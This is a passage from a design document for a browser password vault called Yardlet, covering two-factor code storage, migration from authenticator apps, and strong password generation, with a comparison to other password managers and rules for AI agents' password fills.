- Secrets stay in the keychain. No new settings or shortcuts. What was added: two bars, one menu item, and a list and
  one button in the vault screen; turning off the vault switch removes the bars and the menu item.
- Watching cost: while the page changes, it looks at input fields and images at most once every 0.5 seconds. Images
  already measured are not measured again, and QR checks are capped at 10 per document.

### 14.5 Security trade-offs

Keeping passwords and two-step verification keys together in the same vault on the same Mac makes the two factors one
for whoever opens that vault (or for a program running with Yardlet's signature). 1Password says "The convenience will
usually outweigh the fairly negligible amount of security that may be sacrificed.", while admitting that when the device
is fine and only the 1Password access details are stolen, a separate authenticator app protects more
([blog](https://1password.com/blog/1password-2fa-passwords-codes-together)). Apple only explains that the Passwords app
stores and encrypts one-time passwords together with passwords, and does not discuss this trade-off ([Passwords &
Privacy](https://images.apple.com/legal/privacy/data/en/passwords/)). The Yardlet vault has no sync, so there is no
account to be breached remotely; instead, the user session on this Mac is both factors. For accounts where that
trade-off is unwelcome, such as a bank, keep the key only in the phone authenticator app.

Offering a code with no site by its name compares only the label, not the public suffix, so `vercel.co` would be
offered the Vercel code too. That is no worse than before it was linked: a phone authenticator app shows its codes on
any site. The bar names the site it would save, the person decides, and only the site they filled it on is saved, which
then holds that item to the same site rule as any other (section 6.2). Agents keep to saved sites, so a look-alike page
cannot get a code while the person is away.

### 14.6 What it cannot replace

- **Push approval:** Microsoft Authenticator number matching
  ([Learn](https://learn.microsoft.com/en-us/entra/identity/authentication/how-to-mfa-number-match)), Okta Verify push
  ([help](https://help.okta.com/en-us/content/topics/mobile/okta-verify-overview.htm)) and Google prompts
  ([help](https://support.google.com/accounts/answer/7026266?hl=en)) work by approving, in the registered phone app, a
  request the service sent to that app, so there is no shared secret. If the service also allows TOTP, register that
  method too and read its QR with Yardlet.
- **Text messages:** the service sends the code to the registered number, so there is no secret to store ([Google
  help](https://support.google.com/accounts/answer/185839?hl=en)).
- **Email codes:** out of scope for the person's flow. A possible path: since the Gmail connector already exists, the
  code bar could also offer "the verification code from recent mail" (when a code field shows, read the last few minutes
  of mail from that site and pick out the digits). It was not added this time, because the scope of mail reading and the
  risk of misreading would need to be decided first.

### 14.7 Moving over from an authenticator app

- **Google Authenticator:** on the phone, Menu → Transfer accounts → Export accounts → choose accounts → the QR appears.
  Photograph that screen with another device's camera, or take a screenshot (whether the app blocks this could not be
  confirmed from official sources), move it to the Mac and pick it in Settings → Vault "Import QR Code…". If there are
  several, pick them all. If the image is open in the Yardlet browser, right-click "Add Two-Factor Code from QR Code"
  also works. After the import, move the image files to the Trash.
- **Apps without export, such as Microsoft Authenticator:** set up again, site by site. Sign in to the site in the
  Yardlet panel → two-step verification in the security settings → "set up a different authenticator app" (for a
  Microsoft account "Set up a different Authenticator app", for a work or school account "I want to use a different
  authenticator app",
  [help](https://support.microsoft.com/en-us/authenticator/how-to-add-your-accounts-to-microsoft-authenticator)) → when
  the QR appears, [Save] on the setup bar → Yardlet fills the first code the page asks for → confirm. Once the new key
  is registered, delete that entry from the old app (depending on the site, the old key stops working right away).
- **1Password, Bitwarden and the Apple Passwords app:** export to CSV, then Settings → Vault "Import CSV…". The code
  column comes along.

### 14.8 Verification (2026-10-25)

- Unit and render: `VaultTests.testAuthenticatorExportsBecomeItemsOfTheirOwn` (turns a protobuf export into a QR image
  with CoreImage and reads it back with Vision, leaves out 1 HOTP, 0 on a second import), `VaultSettingsRenderingTests`
  (CSV `login_totp` and code-only rows; draws the settings "Two-factor codes" list, "Import QR Code…" and the item
  sheet's code row in light and dark).
- Real CEF 154 QA bundle (`com.zzunkie.yardlet.vaultqa`, running in the background, a temporary home under `$TMPDIR`,
  the vault in memory, test keys only): `run-check.sh … --ui-fixture-browser-check-only=vault` with 7 panel checks
  added, 37 passed. The QA server's `/vault/otp/setup` (a setup QR and a first-code field) and `/vault/otp/export` (a
  Google Authenticator-style export QR, 2 TOTP and 1 HOTP). The page's RFC 6238 check accepted the code bar fill and the
  key button fill into one-character fields; the setup QR was read automatically and the item with the same account was
  offered as the default target; and the page accepted the first code filled after saving. The export QR was read both
  through the automatic offer and through the right-click menu and became two items (including SHA-256 and 8 digits).
  The panel PNGs (`vault-panel-code-bar`, `-setup-bar`, `-import-bar`) were checked by eye.
- Codes with no site (2026-10-28): `VaultTests.testACodeWithNoSiteIsOfferedWhereItsNameSaysAndKeepsTheSiteThePersonPicksItOn`
  (the name rule, `vercel-login.com` not offered the Vercel code, an agent's refusal without a phishing notification,
  the site kept after the person picks the code, and a site's password and code in two items each filled by kind).
  The same QA run, 39 checks: the QA server's code page served at `https://accounts.qa-vendor.test/` through CDP
  request interception (`Fetch.fulfillRequest`, nothing leaves the Mac) offers a "QA Vendor" code with no site in the
  code bar with `qa-vendor.test`, and filling it passes the page's check and saves that site in the item. The panel PNG
  `vault-panel-unlinked-code-bar` was checked by eye.


## 15. Strong password suggestions (2026-10-28)

The request was the strong password suggestion Chrome and Safari make: when a password is made or changed, the vault
makes a strong random one, offers it, fills it, and keeps it.

### 15.1 Other browsers and managers compared

Read from public sources on 2026-10-28 (a subagent read Chromium's and Bitwarden's source on their `main` branches and
the vendors' help pages; these may differ from released builds).

| | Chrome | Safari | 1Password | Bitwarden |
|---|---|---|---|---|
| When it offers one | Automatically only on a field it knows is a new password: crowdsourced server or model predictions, or `autocomplete="new-password"`, not its basic two- or three-field heuristics ([form_data_parser.cc](https://github.com/chromium/chromium/blob/main/components/password_manager/core/browser/form_parsing/form_data_parser.cc)); right-click "Generate password" on other password fields ([help](https://support.google.com/chrome/answer/95606?hl=en)) | Sign-up and change forms by its own heuristics, helped by `autocomplete="new-password"` ([Apple](https://support.apple.com/en-ca/guide/security/secc84c811c4/web)) | Sign-up and new password fields ([help](https://support.1password.com/generate-website-password/)) | Sign-up and change fields in the inline menu ([overlay.background.ts](https://github.com/bitwarden/clients/blob/main/apps/browser/src/autofill/background/overlay.background.ts)) |
| The password | 15 characters from `abcdefghijkmnpqrstuvwxyz`, `ABCDEFGHJKLMNPQRSTUVWXYZ` and `23456789` (no `l o I O 0 1`), at least one of each; symbols `-_.:!` only when a site's requirements ask ([password_generator.cc](https://chromium.googlesource.com/chromium/src/+/main/components/password_manager/core/browser/generation/password_generator.cc)) | 20 characters in three groups of six joined by hyphens: lower case with one upper case letter and one digit | Its "smart" generator; current defaults unconfirmed | 14 characters, upper and lower case and digits, no symbols, look-alikes allowed ([defaults](https://github.com/bitwarden/clients/blob/main/libs/tools/generator/core/src/data/default-password-generation-options.ts)) |
| Randomness | Rejection before `% range` (`base::RandGenerator`), BoringSSL `RAND_bytes` ([rand_util.cc](https://github.com/chromium/chromium/blob/main/base/rand_util.cc)) | — | — | — |
| A site's rules | Crowdsourced requirements and the field's `maxlength`; no `passwordrules` in the path read | `passwordrules` ([Apple](https://developer.apple.com/documentation/security/customizing-password-autofill-rules)) | `passwordrules` and Apple's site rules ([blog](https://1password.com/blog/a-smarter-password-generator)) | In its SDK; in the extension unconfirmed |
| Confirmation field | Filled ([password_generation_agent.cc](https://github.com/chromium/chromium/blob/main/components/autofill/content/renderer/password_generation_agent.cc)) | Filled (older screenshots only) | Filled | Filled |
| When it is saved | On acceptance (presave); "Clear the username value if there are already saved credentials with the same username in order to prevent overwriting." Committed without a prompt when the submission succeeds; an update may still prompt. Emptying the field deletes the presave ([password_generation_manager.cc](https://github.com/chromium/chromium/blob/main/components/password_manager/core/browser/password_generation_manager.cc), [password_manager.cc](https://github.com/chromium/chromium/blob/main/components/password_manager/core/browser/password_manager.cc)) | With the sign-up; the exact moment is unconfirmed | Into the generator history at once; the login when the person saves ([help](https://support.1password.com/recover-unsaved-password/)) | Into the generator history at once (up to 200); the login after the person confirms |
| Old passwords | Not kept | — | Item history | The last 5 per item ([help](https://bitwarden.com/help/password-and-generator-history/)) |

`passwordrules` is Apple's proposal to the HTML standard: `required:`, `allowed:`, `max-consecutive:`, `minlength:` and
`maxlength:` rules separated by `;`, with the classes `upper`, `lower`, `digit`, `special` (ASCII punctuation and the
space), `ascii-printable`, `unicode` and custom ones in brackets, where `-` comes first and a `]` last, as in `[-abc]]`
([PasswordRulesParser.js](https://github.com/apple/password-manager-resources/blob/main/tools/PasswordRulesParser/PasswordRulesParser.js)).

### 15.2 Decisions

- **When the bar shows:** when an empty new password field takes the focus, the panel shows a bar over the page, "Use a
  strong password for github.com? The password manager saves it. [Not Now] [Use Strong Password]" (the same shape as the
  save and code bars; section 8.3 says why there is no list under the field). A new password field is one marked
  `autocomplete="new-password"`; else, past a current password (marked `current-password` or named so in its name, id,
  placeholder or label), the form's other one or two; else both of a form's two password fields or the last two of three;
  else a lone field named new. Chrome offers automatically only with its server's predictions or the attribute, and
  Yardlet has no server, so its basic heuristics stand in, with the current password told apart by name. A lone password
  field is a sign-in's, so it gets no bar. The bar shows once per page.
- **The other path:** on any password field, right-click "Use Strong Password" (Chrome's "Generate password"). The
  person's click is the choice, so it fills at once.
- **The password:** Chrome's generator (15 characters, its three classes without look-alikes, at least one of each,
  shuffled), plus one of Chrome's symbols `-_.:!`, since many sites insist on a symbol and Yardlet has no list of each
  site's requirements as Chrome has. A site's `passwordrules` replace those classes (Safari and 1Password read them), and
  the field's `minlength` and `maxlength` bound the length. Each character comes from `SecRandomCopyBytes`, drawn 32 bits
  at a time and drawn again when past the last whole multiple of the range (no modulo bias), and the shuffle uses the
  same draws. As Chrome does, `--` and `__` are drawn again. If the random source fails, no password is made.
- **Saving (Chrome's presave):** the password is saved the moment it is filled, so a page that fails or submits on its
  own loses nothing. With no item for that username on the site, it is a new item (named after the site, with the
  username the form holds); submitting the form gives the item the username typed by then, without asking. Beside an
  item of the same username (a change form), the new item has no username, as Chrome's has, so the saved password stays
  the one filled; after the change is submitted, the save bar asks "Update the saved password for github.com?", and
  updating gives the saved item the new password and deletes the item beside it. If the person empties the field before
  submitting, the item made for it is deleted (Chrome's `PasswordNoLongerGenerated`). Choosing again on the same page
  replaces the password in the same item.
- **Previous passwords:** whenever an item's password is replaced (the update bar, the item sheet, a made password), the
  old one stays in the item, the last five with when each was replaced (Bitwarden keeps five). The item sheet shows them
  after Touch ID. So a change the site refused, then updated by mistake, loses nothing.
- **No generator history:** 1Password and Bitwarden keep every generated password in a history. The presave already
  keeps each filled one in an item the person sees, so a second list was not added.

### 15.3 Agents

`browser_fill_credential` takes `kind: new_password` with `ref` on a sign-up form's password field. Yardlet reads the
field's `passwordrules`, `minlength` and `maxlength` and the username the form holds, makes the password, saves it as a
new item (named after the site, or `item`) before the page takes it, and fills it and its confirmation. The result says
only which fields were filled and the item's name and username. The value goes onto the scrubbing list, the document
counts as filled (section 5.3: `browser_evaluate` refused, screenshots covered), and the usage log has the fill.

- **Only new accounts:** when an item of the form's username or of the name in `item` is already saved for the site,
  the call is refused and says to hand the tab to the person. Yardlet cannot tell whether a site took a change, and the
  person's update after it is the step that makes a new password the item's; an agent changing a saved password could
  lock the person out of an account they use.
- **Confirmation step:** a new item has no step yet, and new items default to "Always" (section 6.1), so the fill does
  not ask. The harness's tool approval sits above it as for every fill. The tool is offered as before: with the vault on
  and holding an item.
- **Why account creation is in scope now (section 3):** Codex `browserAuth` leaves it out, but it is a path where the
  model would otherwise type a password it chose, which then sits in the conversation history. Yardlet making it keeps
  the value out of the model's hands, which is the vault's purpose. It is part of the vault, so turning the vault off
  removes it with the rest, and nothing else is written anywhere.

### 15.4 Rules kept

- A made password is a vault value from the first moment: it goes onto the scrubbing list before the page takes it,
  and the bar never holds or shows it. An agent's fill also makes the document a filled one (screenshots covered,
  `browser_evaluate` refused); the person's goes the way of the key button's fill (section 8.3). The watch tells Yardlet that a form with a made password was submitted without
  sending the value (`made`), since Yardlet has it already. No clipboard, no log, no tool result.
- The site comes from the browser's main frame origin, as for every fill; only https sites and local development
  origins get an item.
- Nothing new in Settings and no shortcuts. Added: one bar, one menu item, and the previous passwords row in the item
  sheet. Turning the vault off removes the bar, the menu item and the tool's kind.

### 15.5 Verification
